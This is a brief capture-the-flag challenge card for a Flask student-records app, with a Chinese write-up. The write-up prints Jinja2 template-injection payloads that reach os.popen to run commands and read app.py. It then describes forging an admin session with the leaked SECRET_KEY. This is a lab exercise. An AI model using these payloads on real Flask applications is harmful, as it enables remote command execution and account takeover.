# Description

管理学籍！

# Difficulty

⭐⭐⭐

# Flag

```
FLAG
```

# Platform (Optional)

ARCH

# Hint (Optional)

hint:What is the flask?What problem may flask have？

hint 2:How to chane session?

# WriteUp

输入任意学号姓名后进入index界面，登入后在输入框内发现可以进行ssti模板注入，输入payload：{{"".__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['popen' ] ('ipconfig').read()}}确认有注入点，随后通过{{"".__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['popen']('ls').read()}}和{{"".__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['popen']('cat app.py').read()}}读取源码，发现只有将session['usr']='admin'才能进行学籍管理，同时在源代码发现session的’SECRET_KEY‘,上网搜索flask的session伪造脚本并更改session上传即可获得flag。